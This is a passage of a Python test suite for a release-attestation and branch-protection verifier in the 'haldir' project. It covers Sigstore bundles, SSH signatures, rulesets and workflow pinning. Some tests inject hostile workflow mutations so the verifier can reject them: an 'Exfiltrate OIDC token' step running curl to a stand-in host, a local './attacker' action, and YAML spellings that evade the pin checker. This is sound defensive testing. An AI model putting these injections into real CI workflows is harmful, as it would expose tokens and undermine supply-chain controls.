            ("run_id_bool", {"run_id": True}),
            ("run_id_float", {"run_id": float(RUN_ID)}),
            ("attempt_bool", {"attempt": True}),
            ("attempt_float", {"attempt": float(ATTEMPT)}),
            ("number_bool", {"run_number": True}),
            ("number_float", {"run_number": float(RUN_NUMBER)}),
        ):
            with (
                self.subTest(label=label),
                self.assertRaisesRegex(ValueError, "RESULT_IDENTITY"),
            ):
                self.validate_result(payload, materials, **arguments)

    def test_artifact_integer_and_boolean_fields_reject_coercion(self) -> None:
        payload, _materials = result_payload()
        mutations = (
            ("id", ("id",), 9_001),
            ("size", ("size_in_bytes",), len(payload)),
            (
                "head_repository_id",
                ("workflow_run", "head_repository_id"),
                PROTOCOL.REPOSITORY_ID,
            ),
            ("run_id", ("workflow_run", "id"), RUN_ID),
            (
                "repository_id",
                ("workflow_run", "repository_id"),
                PROTOCOL.REPOSITORY_ID,
            ),
        )
        for label, path, valid in mutations:
            for invalid in (True, float(valid)):
                value = artifact(payload)
                target: Any = value
                for component in path[:-1]:
                    target = target[component]
                target[path[-1]] = invalid
                with (
                    self.subTest(label=label, invalid=invalid),
                    self.assertRaisesRegex(ValueError, "FR0014_"),
                ):
                    self.validate_artifact(value, payload)
        value = artifact(payload)
        value["expired"] = 0
        with self.assertRaisesRegex(ValueError, "ARTIFACT_IDENTITY"):
            self.validate_artifact(value, payload)

    def test_artifact_expected_integer_arguments_reject_coercion(self) -> None:
        payload, _materials = result_payload()
        for label, arguments in (
            ("run_id_bool", {"run_id": True}),
            ("run_id_float", {"run_id": float(RUN_ID)}),
            ("attempt_bool", {"attempt": True}),
            ("attempt_float", {"attempt": float(ATTEMPT)}),
        ):
            with (
                self.subTest(label=label),
                self.assertRaisesRegex(ValueError, "FR0014_INTEGER"),
            ):
                self.validate_artifact(artifact(payload), payload, **arguments)

    def test_artifact_listing_count_rejects_bool_and_float(self) -> None:
        payload, _materials = result_payload()
        listed = artifact(payload)
        self.assertEqual(
            PROTOCOL.validate_artifact_listing(
                {"artifacts": [listed], "total_count": 1}
            ),
            listed,
        )
        for invalid in (True, 1.0):
            with (
                self.subTest(invalid=invalid),
                self.assertRaisesRegex(ValueError, "FR0014_INTEGER"),
            ):
                PROTOCOL.validate_artifact_listing(
                    {"artifacts": [listed], "total_count": invalid}
                )

    def test_artifact_one_second_tolerance_is_exact(self) -> None:
        payload, _materials = result_payload()
        value = artifact(payload)
        value["created_at"] = utc(12, 0, 59)
        value["updated_at"] = utc(12, 4, 1)
        self.validate_artifact(value, payload)

        value = artifact(payload)
        value["created_at"] = utc_fraction(12, 0, 58, 999_999)
        with self.assertRaisesRegex(ValueError, "ARTIFACT_CHRONOLOGY"):
            self.validate_artifact(value, payload)

        value = artifact(payload)
        value["updated_at"] = utc_fraction(12, 4, 1, 1)
        with self.assertRaisesRegex(ValueError, "ARTIFACT_CHRONOLOGY"):
            self.validate_artifact(value, payload)


class AttestationTests(unittest.TestCase):
    def validate(self, bundle: bytes, receipt: list) -> dict:
        payload, _materials = result_payload()
        return PROTOCOL.validate_attestation_evidence(
            bundle,
            receipt,
            workflow="ci",
            result_payload=payload,
            subject_commit=COMMIT,
            expected_ref="refs/heads/main",
            run_id=RUN_ID,
            attempt=ATTEMPT,
            attestation_started=datetime(2026, 7, 29, 12, 6, tzinfo=timezone.utc),
            attestation_completed=datetime(2026, 7, 29, 12, 8, tzinfo=timezone.utc),
        )

    def test_public_good_tlog_receipt_is_valid(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        result = self.validate(bundle, receipt)
        self.assertEqual(result["transparency_log"]["type"], "Tlog")

    def test_transparency_log_type_mutation_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0]["type"] = (
            "TransparencyLog"
        )
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG"):
            self.validate(bundle, receipt)

    def test_unpinned_log_uri_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0]["uri"] = (
            "attacker.invalid"
        )
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG"):
            self.validate(bundle, receipt)

    def test_scheme_less_log_uri_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0]["uri"] = (
            "rekor.sigstore.dev"
        )
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG"):
            self.validate(bundle, receipt)

    def test_capability_url_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["attestation"]["bundle_url"] = "https://example.invalid/token"
        with self.assertRaisesRegex(ValueError, "RECEIPT_BUNDLE"):
            self.validate(bundle, receipt)

    def test_cross_attempt_statement_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload, attempt=1)
        with self.assertRaisesRegex(ValueError, "STATEMENT_MISMATCH"):
            self.validate(bundle, receipt)

    def test_cross_attempt_certificate_is_rejected_independently(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["signature"]["certificate"][
            "runInvocationURI"
        ] = f"https://github.com/sepahead/haldir/actions/runs/{RUN_ID}/attempts/1"
        with self.assertRaisesRegex(ValueError, "ATTESTATION_CERTIFICATE"):
            self.validate(bundle, receipt)

    def test_witness_outside_attestation_job_is_rejected(self) -> None:
        payload, _materials = result_payload()
        bundle, receipt = attestation_fixture(payload)
        receipt[0]["verificationResult"]["verifiedTimestamps"][0]["timestamp"] = utc(
            12, 9
        )
        with self.assertRaisesRegex(ValueError, "TRANSPARENCY_LOG_TIME"):
            self.validate(bundle, receipt)


class TrustedRootAndCommandTests(unittest.TestCase):
    def test_signed_fr0013_qualification_boundary_is_verified_directly(self) -> None:
        BRIDGE._verify_legacy_boundary(ROOT)

    def test_real_openssh_detached_signature_is_accepted(self) -> None:
        payload = b"FR-0014 detached signature parser integration\n"
        namespace = "haldir-fr0014-openssh-integration"
        principal = "fixture@example.invalid"
        with tempfile.TemporaryDirectory() as name:
            repo = Path(name)
            private_key = repo / "signing-key"
            subprocess.run(
                [
                    "/usr/bin/ssh-keygen",
                    "-q",
                    "-t",
                    "ed25519",
                    "-N",
                    "",
                    "-C",
                    principal,
                    "-f",
                    str(private_key),
                ],
                check=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            public_key = private_key.with_suffix(".pub")
            fingerprint = (
                subprocess.check_output(["/usr/bin/ssh-keygen", "-lf", str(public_key)])
                .decode("ascii")
                .split()[1]
            )
            allowed_signers = repo / BRIDGE.ALLOWED_SIGNERS_PATH
            allowed_signers.parent.mkdir(parents=True)
            allowed_signers.write_text(
                f'{principal} namespaces="{namespace}" '
                f"{public_key.read_text(encoding='ascii')}",
                encoding="ascii",
            )
            payload_path = repo / "payload"
            payload_path.write_bytes(payload)
            subprocess.run(
                [
                    "/usr/bin/ssh-keygen",
                    "-Y",
                    "sign",
                    "-f",
                    str(private_key),
                    "-n",
                    namespace,
                    str(payload_path),
                ],
                check=True,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            signature = Path(f"{payload_path}.sig").read_text(encoding="ascii")
            record = {
                "format": "ssh",
                "namespace": namespace,
                "principal": principal,
                "key_fingerprint": fingerprint,
                "signature": signature,
            }
            original_principal = BRIDGE.SIGNER_PRINCIPAL
            original_fingerprint = BRIDGE.SIGNER_FINGERPRINT
            try:
                BRIDGE.SIGNER_PRINCIPAL = principal
                BRIDGE.SIGNER_FINGERPRINT = fingerprint
                BRIDGE._verify_detached(repo, record, payload, namespace=namespace)
            finally:
                BRIDGE.SIGNER_PRINCIPAL = original_principal
                BRIDGE.SIGNER_FINGERPRINT = original_fingerprint

    def test_source_authority_file_is_frozen(self) -> None:
        self.assertIn(
            BRIDGE.ALLOWED_SIGNERS_PATH,
            BRIDGE.FR0013_BOUNDARY_RECORDS,
        )
        self.assertIn(
            BRIDGE.ALLOWED_SIGNERS_PATH,
            BRIDGE.PROTECTED_AFTER_ACTIVATION,
        )
        self.assertTrue(
            BRIDGE.HISTORICAL_RECOVERY_TOOL_PATHS <= BRIDGE.PROTECTED_AFTER_ACTIVATION
        )

    def test_commit_verification_ignores_configured_ssh_program(self) -> None:
        command = BRIDGE._verify_commit_argv(Path("/repo"), COMMIT)
        self.assertIn("gpg.ssh.program=/usr/bin/ssh-keygen", command)
        self.assertIn(
            "gpg.ssh.allowedSignersFile=/repo/release/0.9.0/allowed-signers",
            command,
        )

    def test_exact_public_good_root(self) -> None:
        payload = (ROOT / BRIDGE.TRUSTED_ROOT_PATH).read_bytes()
        BRIDGE._validate_trusted_root(payload)
        self.assertEqual(
            hashlib.sha256(payload).hexdigest(), BRIDGE.TRUSTED_ROOT_SHA256
        )

    def test_root_byte_substitution_is_rejected(self) -> None:
        payload = bytearray((ROOT / BRIDGE.TRUSTED_ROOT_PATH).read_bytes())
        payload[100] ^= 1
        with self.assertRaisesRegex(RuntimeError, "TRUSTED_ROOT_BOUND"):
            BRIDGE._validate_trusted_root(bytes(payload))

    def test_offline_verification_argv_is_exact(self) -> None:
        command = BRIDGE._verification_argv(
            executable=Path("/usr/bin/gh"),
            result_path=Path("/tmp/result"),
            bundle_path=Path("/tmp/bundle"),
            trusted_root_path=Path("/tmp/root"),
            workflow="ci",
            subject_commit=COMMIT,
        )
        for flag in (
            "--bundle",
            "--custom-trusted-root",
            "--cert-identity",
            "--cert-oidc-issuer",
            "--deny-self-hosted-runners",
            "--predicate-type",
            "--signer-digest",
            "--source-digest",
            "--source-ref",
        ):
            self.assertEqual(command.count(flag), 1)
        self.assertNotIn("--no-public-good", command)
        self.assertNotIn("--signer-workflow", command)
        self.assertIn(COMMIT, command)

    def test_offline_verification_environment_is_deterministic(self) -> None:
        environment = BRIDGE._offline_verification_environment(
            executable=Path("/opt/gh/bin/gh"),
            root=Path("/tmp/root"),
            config_dir=Path("/tmp/root/config"),
        )
        self.assertEqual(environment["TZ"], "UTC")
        self.assertEqual(environment["LC_ALL"], "C")
        self.assertEqual(environment["PATH"], "/opt/gh/bin:/usr/bin:/bin")
        self.assertEqual(environment["NO_PROXY"], "")
        self.assertEqual(
            {
                environment["ALL_PROXY"],
                environment["HTTPS_PROXY"],
                environment["HTTP_PROXY"],
            },
            {"http://127.0.0.1:1"},
        )
        self.assertNotIn("LANG", environment)

    def test_hosted_commands_use_exact_artifact_id(self) -> None:
        commands = BRIDGE._hosted_commands(
            workflow="ci",
            run_id=RUN_ID,
            attempt=ATTEMPT,
            artifact_id=9001,
        )
        self.assertIn("/artifacts/9001/zip", commands["artifact_download"])
        self.assertIn("/artifacts/9001", commands["artifact_get"])
        self.assertNotIn("gh run download", commands["artifact_download"])
        self.assertIn("attempt-2.json", commands["artifact_list"])


class WorktreeIntegrityTests(unittest.TestCase):
    def test_executable_drift_and_unsafe_write_bits_are_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo = Path(name)
            subprocess.run(
                ["/usr/bin/git", "init", "-q", repo],
                check=True,
            )
            protected = repo / "protected.txt"
            protected.write_text("frozen\n")
            environment = {
                **os.environ,
                "GIT_AUTHOR_NAME": "Test",
                "GIT_AUTHOR_EMAIL": "test@example.invalid",
                "GIT_COMMITTER_NAME": "Test",
                "GIT_COMMITTER_EMAIL": "test@example.invalid",
                "GIT_CONFIG_GLOBAL": os.devnull,
                "GIT_CONFIG_NOSYSTEM": "1",
            }
            subprocess.run(
                ["/usr/bin/git", "-C", repo, "add", "protected.txt"],
                check=True,
                env=environment,
            )
            subprocess.run(
                [
                    "/usr/bin/git",
                    "-C",
                    repo,
                    "-c",
                    "commit.gpgsign=false",
                    "commit",
                    "-q",
                    "-m",
                    "fixture",
                ],
                check=True,
                env=environment,
            )
            commit = (
                subprocess.check_output(
                    ["/usr/bin/git", "-C", repo, "rev-parse", "HEAD"],
                    env=environment,
                )
                .decode()
                .strip()
            )
            os.chmod(protected, 0o644)
            BRIDGE._verify_worktree(repo, commit, ["protected.txt"])
            for mode in (0o755, 0o666):
                with self.subTest(mode=oct(mode)):
                    os.chmod(protected, mode)
                    with self.assertRaisesRegex(RuntimeError, "FR0014_WORKTREE"):
                        BRIDGE._verify_worktree(repo, commit, ["protected.txt"])


class RulesetTests(unittest.TestCase):
    def fixture(self) -> tuple[dict, list, dict, list, list, dict]:
        return repository_identity(), *ruleset_documents()

    def test_owner_only_main_ruleset(self) -> None:
        result = BRIDGE.validate_main_writer_ruleset(*self.fixture())
        self.assertEqual(result["owner_user_id"], 10_104_569)
        self.assertEqual(result["observed_get_rule"], {"type": "update"})
        self.assertFalse(result["default_parameter_reconstructed"])
        self.assertIn("GITHUB_APPS", result["protects_against"])

    def test_additional_bypass_actor_is_rejected(self) -> None:
        repository, summary, detail, effective, history, version = self.fixture()
        detail["bypass_actors"].append(
            {"actor_id": 99, "actor_type": "User", "bypass_mode": "always"}
        )
        with self.assertRaisesRegex(RuntimeError, "RULESET_"):
            BRIDGE.validate_main_writer_ruleset(
                repository,
                summary,
                detail,
                effective,
                history,
                version,
            )

    def test_live_get_rule_requires_parameter_omission(self) -> None:
        explicit_values = (False, True, None, {}, 0, 0.0)
        for document in ("detail", "effective", "version"):
            for explicit in explicit_values:
                fixture = list(self.fixture())
                selected = {
                    "detail": fixture[2]["rules"][0],
                    "effective": fixture[3][0],
                    "version": fixture[5]["state"]["rules"][0],
                }[document]
                selected["parameters"] = copy.deepcopy(explicit)
                with (
                    self.subTest(document=document, explicit=explicit),
                    self.assertRaisesRegex(RuntimeError, "RULESET_"),
                ):
                    BRIDGE.validate_main_writer_ruleset(*fixture)
            fixture = list(self.fixture())
            selected = {
                "detail": fixture[2]["rules"][0],
                "effective": fixture[3][0],
                "version": fixture[5]["state"]["rules"][0],
            }[document]
            selected["unexpected"] = False
            with (
                self.subTest(document=document, explicit="extra"),
                self.assertRaisesRegex(RuntimeError, "RULESET_"),
            ):
                BRIDGE.validate_main_writer_ruleset(*fixture)

    def test_ruleset_integer_fields_reject_bool_and_float(self) -> None:
        mutations = (
            (
                "summary_id",
                lambda fixture, value: fixture[1][0].__setitem__("id", value),
                8_181,
            ),
            (
                "detail_id",
                lambda fixture, value: fixture[2].__setitem__("id", value),
                8_181,
            ),
            (
                "actor_id",
                lambda fixture, value: fixture[2]["bypass_actors"][0].__setitem__(
                    "actor_id", value
                ),
                BRIDGE.MAIN_RULESET_OWNER_ID,
            ),
            (
                "effective_id",
                lambda fixture, value: fixture[3][0].__setitem__("ruleset_id", value),
                8_181,
            ),
            (
                "history_version_id",
                lambda fixture, value: fixture[4][0].__setitem__("version_id", value),
                9_191,
            ),
            (
                "history_actor_id",
                lambda fixture, value: fixture[4][0]["actor"].__setitem__("id", value),
                BRIDGE.MAIN_RULESET_OWNER_ID,
            ),
            (
                "version_id",
                lambda fixture, value: fixture[5].__setitem__("version_id", value),
                9_191,
            ),
            (
                "version_actor_id",
                lambda fixture, value: fixture[5]["actor"].__setitem__("id", value),
                BRIDGE.MAIN_RULESET_OWNER_ID,
            ),
            (
                "version_state_id",
                lambda fixture, value: fixture[5]["state"].__setitem__("id", value),
                8_181,
            ),
            (
                "version_state_actor_id",
                lambda fixture, value: fixture[5]["state"]["bypass_actors"][
                    0
                ].__setitem__("actor_id", value),
                BRIDGE.MAIN_RULESET_OWNER_ID,
            ),
        )
        for label, mutate, valid in mutations:
            for invalid in (True, float(valid)):
                fixture = list(self.fixture())
                mutate(fixture, invalid)
                with (
                    self.subTest(label=label, invalid=invalid),
                    self.assertRaisesRegex(RuntimeError, "RULESET_"),
                ):
                    BRIDGE.validate_main_writer_ruleset(*fixture)

    def test_history_version_is_strictly_cross_linked(self) -> None:
        mutations = (
            lambda fixture: fixture[5]["actor"].__setitem__("id", 99),
            lambda fixture: fixture[5].__setitem__(
                "updated_at", "2026-07-29T20:59:52.000+02:00"
            ),
            lambda fixture: fixture[5]["state"].__setitem__("id", 99),
            lambda fixture: fixture[5]["state"].__setitem__("updated_at", False),
            lambda fixture: fixture[4].append(copy.deepcopy(fixture[4][0])),
        )
        for index, mutate in enumerate(mutations):
            fixture = list(self.fixture())
            mutate(fixture)
            with (
                self.subTest(index=index),
                self.assertRaisesRegex(RuntimeError, "RULESET_"),
            ):
                BRIDGE.validate_main_writer_ruleset(*fixture)

    def test_authority_fields_require_exact_json_types(self) -> None:
        authority = BRIDGE._authority("PENDING_QUALIFICATION")
        BRIDGE._validate_authority(
            authority,
            state="PENDING_QUALIFICATION",
        )
        attacks = (
            ("framework_epoch", 15.0),
            ("release_authorized", 0),
            ("deployment_authorized", 0.0),
        )
        for field, invalid in attacks:
            mutated = copy.deepcopy(authority)
            mutated[field] = invalid
            with (
                self.subTest(field=field),
                self.assertRaisesRegex(RuntimeError, "AUTHORITY_SCHEMA"),
            ):
                BRIDGE._validate_authority(
                    mutated,
                    state="PENDING_QUALIFICATION",
                )

    def test_non_main_condition_is_rejected(self) -> None:
        repository, summary, detail, effective, history, version = self.fixture()
        detail["conditions"]["ref_name"]["include"] = ["~ALL"]
        with self.assertRaisesRegex(RuntimeError, "RULESET_"):
            BRIDGE.validate_main_writer_ruleset(
                repository,
                summary,
                detail,
                effective,
                history,
                version,
            )


class BranchProtectionRecordTests(unittest.TestCase):
    def validate(self, value: dict) -> dict:
        containing_commit = "c" * 40

        def metadata(_repo: Path, commit: str) -> dict[str, str]:
            hour = 11 if commit == COMMIT else 13
            return {"committer_date": f"2026-07-29T{hour:02d}:00:00+00:00"}

        with (
            mock.patch.object(BRIDGE, "_read_json", return_value=(value, b"")),
            mock.patch.object(BRIDGE, "_metadata", side_effect=metadata),
        ):
            return BRIDGE._verify_branch_protection(
                ROOT,
                containing_commit,
                COMMIT,
            )

    def test_exact_branch_control_record(self) -> None:
        result = self.validate(branch_protection_record())
        self.assertEqual(result["validated_ruleset_policy"]["id"], 8_181)

    def test_branch_repository_and_check_ids_reject_coercion(self) -> None:
        for invalid in (True, 1_292_802_592.0):
            value = branch_protection_record()
            value["repository"]["id"] = invalid
            with (
                self.subTest(field="repository.id", invalid=invalid),
                self.assertRaisesRegex(RuntimeError, "REPOSITORY_IDENTITY"),
            ):
                self.validate(value)
        for invalid in (True, float(BRIDGE.MAIN_RULESET_OWNER_ID)):
            value = branch_protection_record()
            value["repository"]["owner"]["id"] = invalid
            with (
                self.subTest(field="repository.owner.id", invalid=invalid),
                self.assertRaisesRegex(RuntimeError, "REPOSITORY_IDENTITY"),
            ):
                self.validate(value)
        for invalid in (True, float(BRIDGE.GITHUB_ACTIONS_APP_ID)):
            value = branch_protection_record()
            value["protection"]["required_status_checks"]["checks"][0]["app_id"] = (
                invalid
            )
            with (
                self.subTest(field="app_id", invalid=invalid),
                self.assertRaisesRegex(RuntimeError, "BRANCH_PROTECTION_POLICY"),
            ):
                self.validate(value)

    def test_branch_authority_and_policy_bools_reject_integer_aliases(self) -> None:
        for field in (
            "cryptographic_proof",
            "durable_external_state_proof",
            "release_authority",
        ):
            value = branch_protection_record()
            value["authority"][field] = 0
            with (
                self.subTest(authority=field),
                self.assertRaisesRegex(RuntimeError, "BRANCH_PROTECTION_SCHEMA"),
            ):
                self.validate(value)
        for field in (
            "enforce_admins",
            "required_linear_history",
            "required_signatures",
            "allow_force_pushes",
            "allow_deletions",
            "block_creations",
            "required_conversation_resolution",
            "lock_branch",
            "allow_fork_syncing",
        ):
            for invalid in (0, 1, 0.0, 1.0):
                value = branch_protection_record()
                value["protection"][field]["enabled"] = invalid
                with (
                    self.subTest(policy=field, invalid=invalid),
                    self.assertRaisesRegex(RuntimeError, "BRANCH_PROTECTION_POLICY"),
                ):
                    self.validate(value)

    def test_repository_identity_is_exact_nonfork_without_source(self) -> None:
        for field in ("fork", "has_parent", "has_source"):
            for invalid in (True, 0, 0.0, None):
                value = branch_protection_record()
                value["repository"][field] = invalid
                with (
                    self.subTest(field=field, invalid=invalid),
                    self.assertRaisesRegex(RuntimeError, "REPOSITORY_IDENTITY"),
                ):
                    self.validate(value)
        for field in ("parent", "source"):
            value = branch_protection_record()
            value["repository"][field] = None
            with (
                self.subTest(explicit_presence=field),
                self.assertRaisesRegex(RuntimeError, "REPOSITORY_IDENTITY"),
            ):
                self.validate(value)

    def test_protection_get_shape_is_exact_and_materialized(self) -> None:
        contexts = sorted(BRIDGE.REQUIRED_PRE_ACCEPT_CHECKS)
        self.assertEqual(
            BRIDGE.BRANCH_PROTECTION_PUT_BODY,
            {
                "required_status_checks": {
                    "strict": True,
                    "checks": [
                        {
                            "context": context,
                            "app_id": BRIDGE.GITHUB_ACTIONS_APP_ID,
                        }
                        for context in contexts
                    ],
                },
                "enforce_admins": True,
                "required_pull_request_reviews": None,
                "restrictions": None,
                "required_linear_history": True,
                "allow_force_pushes": False,
                "allow_deletions": False,
                "block_creations": False,
                "required_conversation_resolution": False,
                "lock_branch": False,
                "allow_fork_syncing": False,
            },
        )
        self.assertNotIn(
            "contexts",
            BRIDGE.BRANCH_PROTECTION_PUT_BODY["required_status_checks"],
        )
        value = branch_protection_record()
        self.assertIn(
            "contexts",
            value["protection"]["required_status_checks"],
        )
        value["protection"]["required_status_checks"]["extra"] = None
        with self.assertRaisesRegex(RuntimeError, "BRANCH_PROTECTION_POLICY"):
            self.validate(value)
        for invalid in (0, 1, 0.0, 1.0):
            value = branch_protection_record()
            value["protection"]["required_status_checks"]["strict"] = invalid
            with (
                self.subTest(strict=invalid),
                self.assertRaisesRegex(RuntimeError, "BRANCH_PROTECTION_POLICY"),
            ):
                self.validate(value)


class WorkflowAndPinTests(unittest.TestCase):
    def test_rqa_scopes_are_exact_append_only(self) -> None:
        self.assertEqual(
            BRIDGE.REPAIR_STATUSES,
            {
                BRIDGE.CI_WORKFLOW_PATH: "M",
                BRIDGE.FORMAL_WORKFLOW_PATH: "M",
                BRIDGE.PLAN_PATH: "A",
                BRIDGE.PIN_VERIFIER_PATH: "M",
                BRIDGE.GATE_PATH: "M",
                BRIDGE.MODULE_PATH: "A",
                BRIDGE.CAPTURE_PATH: "A",
                BRIDGE.RESULT_PATH: "A",
                BRIDGE.BRIDGE_PATH: "A",
                BRIDGE.TEST_PATH: "A",
            },
        )
        self.assertEqual(
            BRIDGE.QUALIFICATION_STATUSES,
            {
                BRIDGE.QUALIFICATION_PATH: "A",
                **{path: "A" for path in BRIDGE.QUALIFICATION_EVIDENCE_PATHS},
            },
        )
        self.assertEqual(
            BRIDGE.ACTIVATION_STATUSES,
            {
                BRIDGE.ACTIVATION_PATH: "A",
                **{path: "A" for path in BRIDGE.ACTIVATION_EVIDENCE_PATHS},
            },
        )
        all_stage_paths = (
            set(BRIDGE.REPAIR_STATUSES)
            | set(BRIDGE.QUALIFICATION_STATUSES)
            | set(BRIDGE.ACTIVATION_STATUSES)
        )
        self.assertFalse(all_stage_paths & BRIDGE.HISTORICAL_RECOVERY_TOOL_PATHS)
        self.assertEqual(
            BRIDGE.PLAN_NAMESPACE,
            "haldir-framework-recovery-fr-0014-plan-v1",
        )
        self.assertEqual(
            BRIDGE.QUALIFICATION_NAMESPACE,
            "haldir-framework-recovery-fr-0014-qualification-v1",
        )
        self.assertEqual(
            BRIDGE.ACTIVATION_NAMESPACE,
            "haldir-framework-recovery-fr-0014-activation-v1",
        )
        self.assertEqual(
            BRIDGE.FR0013_PLAN_NAMESPACE,
            "haldir-framework-recovery-fr-0013-plan-v1",
        )
        self.assertEqual(
            BRIDGE.FR0013_QUALIFICATION_NAMESPACE,
            "haldir-framework-recovery-fr-0013-qualification-v1",
        )
        self.assertEqual(
            len(
                {
                    BRIDGE.PLAN_NAMESPACE,
                    BRIDGE.QUALIFICATION_NAMESPACE,
                    BRIDGE.ACTIVATION_NAMESPACE,
                    BRIDGE.FR0013_PLAN_NAMESPACE,
                    BRIDGE.FR0013_QUALIFICATION_NAMESPACE,
                }
            ),
            5,
        )

    def test_all_uses_syntax_is_accounted(self) -> None:
        uses, problems = PINS.collect_uses(
            "steps:\n  - uses: owner/action@" + "a" * 40 + "\n",
            label="fixture",
        )
        self.assertEqual(len(uses), 1)
        self.assertEqual(problems, [])

    def test_quoted_uses_key_is_rejected(self) -> None:
        _uses, problems = PINS.collect_uses(
            '"uses": owner/action@' + "a" * 40 + "\n",
            label="fixture",
        )
        self.assertTrue(problems)

    def test_yaml_equivalent_uses_spellings_are_rejected(self) -> None:
        mutable = "actions/checkout@main"
        evasions = {
            "escaped-key": f'"u\\u0073es": {mutable}\n',
            "explicit-tagged-key": f"? !!str uses\n: {mutable}\n",
            "flow-mapping": f"job: {{ uses: {mutable} }}\n",
            "flow-pair": f'steps: ["uses": {mutable}]\n',
            "tagged-key": f"!!str uses: {mutable}\n",
            "block-scalar-dedent": (
                "steps:\n"
                "  - run: |\n"
                "        echo deliberately over-indented\n"
                f'    "u\\u0073es": {mutable}\n'
            ),
            "empty-block-scalar-sibling": (
                f'steps:\n  - run: |\n    "u\\u0073es": {mutable}\n'
            ),
        }
        for label, text in evasions.items():
            with self.subTest(label=label):
                _uses, problems = PINS.collect_uses(text, label="fixture")
                self.assertTrue(problems)

    def test_current_workflows_use_the_restricted_yaml_subset(self) -> None:
        for path in sorted((ROOT / ".github/workflows").glob("*.y*ml")):
            with self.subTest(path=path.name):
                self.assertEqual(
                    PINS.validate_workflow_syntax(
                        path.read_text(),
                        label=path.name,
                    ),
                    [],
                )

    def test_mutable_container_is_rejected(self) -> None:
        _uses, problems = PINS.collect_uses(
            "uses: docker://alpine:latest\n", label="fixture"
        )
        self.assertTrue(problems)

    def test_oidc_jobs_have_no_repository_execution(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        formal = (ROOT / ".github/workflows/formal.yml").read_text()
        self.assertEqual(
            PINS.verify_oidc_job(
                ci,
                label="ci",
                job="attest-ci-audit-result",
                expected_needs=(
                    "build-test",
                    "clean-build",
                    "feature-matrix",
                    "interop",
                    "macos-compile",
                    "supply-chain",
                ),
            ),
            [],
        )
        self.assertEqual(
            PINS.verify_oidc_job(
                formal,
                label="formal",
                job="attest-formal-audit-result",
                expected_needs=("tlc-model-check",),
            ),
            [],
        )

    def test_oidc_local_action_mutation_is_rejected(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        mutated = ci.replace(
            "      - name: Download immutable audit result",
            "      - uses: ./attacker\n      - name: Download immutable audit result",
        )
        problems = PINS.verify_oidc_job(
            mutated,
            label="ci",
            job="attest-ci-audit-result",
            expected_needs=(
                "build-test",
                "clean-build",
                "feature-matrix",
                "interop",
                "macos-compile",
                "supply-chain",
            ),
        )
        self.assertTrue(problems)

    def test_oidc_commented_condition_and_always_are_rejected(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        condition = (
            "    if: >-\n"
            "      github.repository == 'sepahead/haldir' &&\n"
            "      github.event_name == 'push' &&\n"
            "      github.ref == 'refs/heads/main'\n"
        )
        replacement = (
            "    # if: >-\n"
            "    #   github.repository == 'sepahead/haldir' &&\n"
            "    #   github.event_name == 'push' &&\n"
            "    #   github.ref == 'refs/heads/main'\n"
            "    if: always()\n"
        )
        mutated = ci.replace(condition, replacement, 1)
        self.assertNotEqual(mutated, ci)
        self.assertTrue(
            PINS.verify_oidc_job(
                mutated,
                label="ci",
                job="attest-ci-audit-result",
                expected_needs=(
                    "build-test",
                    "clean-build",
                    "feature-matrix",
                    "interop",
                    "macos-compile",
                    "supply-chain",
                ),
            )
        )

    def test_oidc_injected_shell_step_is_rejected(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        marker = "      - name: Download immutable audit result\n"
        injected = (
            "      - name: Exfiltrate OIDC token\n"
            "        run: curl https://example.invalid\n" + marker
        )
        mutated = ci.replace(marker, injected, 1)
        self.assertNotEqual(mutated, ci)
        self.assertTrue(
            PINS.verify_oidc_job(
                mutated,
                label="ci",
                job="attest-ci-audit-result",
                expected_needs=(
                    "build-test",
                    "clean-build",
                    "feature-matrix",
                    "interop",
                    "macos-compile",
                    "supply-chain",
                ),
            )
        )

    def test_attempt_qualified_unarchived_outputs(self) -> None:
        for workflow in ("ci", "formal"):
            text = (ROOT / f".github/workflows/{workflow}.yml").read_text()
            self.assertIn("archive: false", text)
            self.assertIn(
                f"epoch-15-{workflow}-result-attempt-${{{{ github.run_attempt }}}}.json",
                text,
            )
            self.assertNotIn(f"name: epoch-15-{workflow}-result-attempt", text)

    def test_github_cli_archive_is_immutable(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        self.assertEqual(BRIDGE.GH_CLI_VERSION, "2.96.0")
        self.assertIn(BRIDGE.GH_CLI_LINUX_AMD64_ARCHIVE_SHA256, ci)
        self.assertIn(str(BRIDGE.GH_CLI_LINUX_AMD64_ARCHIVE_BYTES), ci)
        self.assertIn(BRIDGE.GH_CLI_LINUX_AMD64_BINARY_SHA256, ci)
        self.assertIn(str(BRIDGE.GH_CLI_LINUX_AMD64_BINARY_BYTES), ci)
        self.assertIn(
            "releases/download/v${GH_CLI_VERSION}/"
            "gh_${GH_CLI_VERSION}_linux_amd64.tar.gz",
            ci,
        )
        self.assertIn("--proto '=https'", ci)
        self.assertIn("--proto-redir '=https'", ci)
        self.assertIn("--tlsv1.2", ci)
        self.assertIn(
            '-- "gh_${GH_CLI_VERSION}_linux_amd64/bin/gh"',
            ci,
        )
        self.assertIn("sha256sum --check --strict", ci)
        self.assertNotIn("curl |", ci)

    def test_hosted_runner_labels_are_versioned(self) -> None:
